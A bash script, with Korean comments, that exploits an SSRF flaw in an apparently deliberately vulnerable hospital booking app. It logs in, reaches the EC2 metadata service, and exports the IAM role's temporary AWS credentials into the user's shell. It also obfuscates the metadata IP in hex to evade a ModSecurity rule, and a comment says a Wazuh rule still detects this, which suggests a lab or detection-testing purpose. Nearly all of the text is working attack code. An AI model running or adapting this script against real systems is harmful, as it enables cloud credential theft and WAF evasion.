#!/usr/bin/env bash
# SSRF -> IMDSv1 -> EC2 role 임시 자격증명 탈취 스크립트 (WSL/bash용)
#
# vuln-hospital-booking의 /api/documents/referral-attachment-import 엔드포인트가
# (전원 접수 시 의뢰 병원이 제공한 의뢰서 원본 문서 URL을 가져오는 기능)
# 로그인한 사용자가 넘긴 url을 서버에서 그대로 requests.get()하는 SSRF를
# 이용해서, EC2 인스턴스 메타데이터(IMDSv1, 토큰 불필요)에서 IAM 역할의
# 임시 자격증명을 읽어온다.
#
# 사용법:
#   source ssrf_steal_ec2_creds.sh
#   (또는) . ssrf_steal_ec2_creds.sh
#
# source로 실행해야 AWS_ACCESS_KEY_ID 등이 현재 쉘에 남는다.
# 그냥 실행(bash ssrf_steal_ec2_creds.sh)하면 하위 프로세스에서 끝나서
# 현재 쉘에는 아무 것도 안 남는다.

set -u

BASE_URL="${BASE_URL:-http://52.78.15.169:5001}"
LOGIN_USER="${LOGIN_USER:-alice}"
LOGIN_PASS="${LOGIN_PASS:-PatientPass123!}"
ROLE_NAME="${ROLE_NAME:-vuln-hospital-ec2-ssm-role}"
COOKIE_JAR="$(mktemp)"

cleanup() { rm -f "$COOKIE_JAR"; }
trap cleanup RETURN 2>/dev/null || true

log() { echo "[ssrf] $*" >&2; }

# 1. 세션 로그인 (SSRF 엔드포인트가 @login_required라 세션 쿠키 필요)
log "로그인 중... ($LOGIN_USER)"
curl -s -c "$COOKIE_JAR" -o /dev/null -w '%{http_code}' \
  -X POST "$BASE_URL/login" \
  --data-urlencode "username=$LOGIN_USER" \
  --data-urlencode "password=$LOGIN_PASS" > /tmp/.ssrf_login_status
LOGIN_STATUS=$(cat /tmp/.ssrf_login_status); rm -f /tmp/.ssrf_login_status
if [ "$LOGIN_STATUS" != "302" ]; then
  log "로그인 실패 (HTTP $LOGIN_STATUS) - LOGIN_USER/LOGIN_PASS 확인"
  return 1 2>/dev/null || exit 1
fi

# 2. SSRF로 IMDS에서 자격증명 JSON 가져오기
# 169.254.169.254를 원문 그대로 쓰면 ModSecurity CRS 931100(ARGS:url의 dotted-decimal
# IP 패턴 탐지, REQUEST-931-APPLICATION-ATTACK-RFI.conf)에 걸려 WAF가 403으로 막는다.
# 16진수 표기(0xa9fea9fe)로 난독화하면 CRS 정규식은 피하면서, Wazuh local_rules.xml의
# 100011은 이 우회까지 커버하도록 설계돼 있어 그대로 탐지된다.
IMDS_URL="http://0xa9fea9fe/latest/meta-data/iam/security-credentials/${ROLE_NAME}"
log "SSRF 경유로 IMDS 조회: $IMDS_URL"

RESPONSE=$(curl -s -b "$COOKIE_JAR" -G \
  --data-urlencode "url=$IMDS_URL" \
  "$BASE_URL/api/documents/referral-attachment-import")

# content 필드(문자열로 이스케이프된 IMDS JSON 원문)만 추출
CREDS_JSON=$(python3 -c '
import json, sys
data = json.loads(sys.stdin.read())
content = data.get("content")
if not content:
    sys.exit("no content field in SSRF response: " + sys.stdin.read())
print(content)
' <<< "$RESPONSE")

if [ -z "$CREDS_JSON" ]; then
  log "SSRF 응답에서 자격증명을 못 찾음. 원본 응답:"
  echo "$RESPONSE" >&2
  return 1 2>/dev/null || exit 1
fi

AWS_ACCESS_KEY_ID=$(python3 -c 'import json,sys; print(json.loads(sys.argv[1])["AccessKeyId"])' "$CREDS_JSON")
AWS_SECRET_ACCESS_KEY=$(python3 -c 'import json,sys; print(json.loads(sys.argv[1])["SecretAccessKey"])' "$CREDS_JSON")
AWS_SESSION_TOKEN=$(python3 -c 'import json,sys; print(json.loads(sys.argv[1])["Token"])' "$CREDS_JSON")
EXPIRATION=$(python3 -c 'import json,sys; print(json.loads(sys.argv[1])["Expiration"])' "$CREDS_JSON")

export AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
export AWS_DEFAULT_REGION="ap-northeast-2"

log "탈취 완료 (role=$ROLE_NAME, expires=$EXPIRATION)"
log "AWS_ACCESS_KEY_ID=$AWS_ACCESS_KEY_ID"
log "현재 쉘에 자격증명이 export 됐습니다. 'aws sts get-caller-identity'로 확인하세요."
